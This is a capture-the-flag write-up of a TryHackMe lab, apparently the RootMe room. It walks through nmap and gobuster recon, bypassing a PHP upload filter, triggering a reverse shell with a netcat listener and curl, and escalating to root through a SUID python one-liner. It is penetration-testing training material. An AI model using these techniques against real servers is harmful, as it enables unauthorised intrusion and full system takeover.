#easy #ctf #tryhackme

# >> Sudhanshu Chatterjee | Jul 30th '24

## TASK 2 - RECON
Did all kinds of different scans to get separate info on separate subjects. Scans included:
- **NMAP**
	- Port scans
	```shell
	sudo nmap --top-ports 20 <MACHINE_IP> -v
	```
	
	- Script / version related vuln. scans
	```shell
	sudo nmap -sC -sV <MACHINE_IP> -v
	```
	
	- a half-done `-A` (aggressive) scan simultaneously, just in case the above scans don't produce any results at all!

- **Gobuster**
	- A directory scan to check for globally accessible directories. Revealed several, out of which 2 were more... interesting🤷🏼.
	```shell
	gobuster dir --url http://<machine_ip>/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t100
	```
	
	- Showed 2 directories of interest, well, they WERE interesting in comparison to the others, `/u******` and `/p****` (Not giving spoilers here!)

These present enough data to:
1. Answer all question from this task.
2. Move forward to next task.

## TASK 3 - Get A Shell
This here is interesting because:
- It requires some research - [HINT](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)
- Requires you to make edits to the found `PHP` script to your own advantage. Not a big one, just the `IP`. (Not giving anymore spoilers here!)

Once you get the shell, modify the `IP` to your designated VPN ip. Upload it on the found directory (Come on! You haven't visited the hidden directories yet!).

It's not as easy at it seems. The upload does not allow `.php` extension. Few things we can do to bypass this.

**->> Bypassing Upload Restriction**:
- Check if it's just a string check! or anything containing `php` in its name is not allowed at all. Do this by changing the extension to name to any PHP version, let say `php5`
- It gets permitted to be uploaded. But just in case it DOES NOT. Try changing `magic bits` of uploaded file to match with other **uploadable** (YEAH! I know its not a word! But describes the purpose.) extensions such as `.jpeg` or something else.

Anyways back to Shell. If you did read the and modify the PHP script, which I hope you did, you know what port the script would listen to.

On **OUR** terminal, turn on `netcat` to listen to the stated port.
```shell
netcat -nlvp <port>
```
Now get another terminal on OUR system, and `curl` the script to invoke it.

```shell
curl http://<machine_ip>/uploads/<your_shell_scp_name>.php5
```

This would get you a reverse shell from the target machine, on YOUR LISTENING terminal.

Find the stated file to get your flag:
```shell
sudo find / -type f -name user.txt 2> /dev/null
```
- `2> /dev/null` - to not show any errors messages in search result.

Time to takeover!

## TASK 4 - Privilege Escalation
As stated in task, look for files with SUID permit. If you don't know what that is, go have a read on it. Internet is free to use.

Once done reading, run a `find` command to look for those files:
```shell
sudo find / -type f -user root -perm -u=s 2> /dev/null
```

This should list all the SUID bit-set files. You'll find one which usually does not belong to it. `/p....`!

Look at the hint to learn about [GTFObins](https://gtfobins.github.io/#). Search for found file, read on it. You'll see python has some tricks to give something it should NOT be able to.

Run:
```shell
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
This code would do the trick, and get you in as **root**. Congrats!

Search for stated file:
```shell
find / -type f -name root.txt
```
Get you flag and you are all set!